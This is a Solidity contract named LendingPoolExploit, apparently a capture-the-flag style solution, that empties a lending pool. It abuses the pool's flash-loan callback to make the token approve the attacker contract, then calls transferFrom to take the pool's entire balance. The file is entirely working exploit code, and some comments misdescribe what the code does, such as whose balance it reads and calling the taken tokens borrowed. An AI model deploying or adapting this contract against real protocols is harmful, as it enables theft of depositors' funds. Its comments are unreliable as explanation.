// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Import the ILendingPool and ILendingPoolToken interfaces
interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

interface ILendingPoolToken {
    // ILendingPoolToken is ERC20
    // declare any ERC20 functions that you need to call here
    function balanceOf(address) external view returns (uint);
    function approve(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
}

// Define the LendingPoolExploit contract
contract LendingPoolExploit {
    // Declare public variables to hold instances of the interfaces
    ILendingPool public pool;
    ILendingPoolToken public token;

    // Constructor that takes the address of the lending pool contract
    constructor(address _pool) {
        // Initialize the pool and token variables by casting the _pool address to the interfaces
        pool = ILendingPool(_pool);
        token = ILendingPoolToken(pool.token());
    }

    // The main function to exploit the lending pool
    function pwn() external {
        // Get the balance of this contract with the lending pool token
        uint bal = token.balanceOf(address(pool));

        // Call the flashLoan function of the lending pool to perform a flash loan
        // Flash loans are used to borrow tokens temporarily and must be repaid within the same transaction
        // In the first flashLoan call, we approve this contract to spend the token balance
        pool.flashLoan(0, address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), bal));

        // In the second flashLoan call, we use the approve function selector to approve the transfer
        pool.flashLoan(0, address(token), abi.encodeWithSelector(token.approve.selector, address(this), bal));

        // Finally, we transfer the borrowed tokens from the lending pool to this contract
        token.transferFrom(address(pool), address(this), bal);
    }
}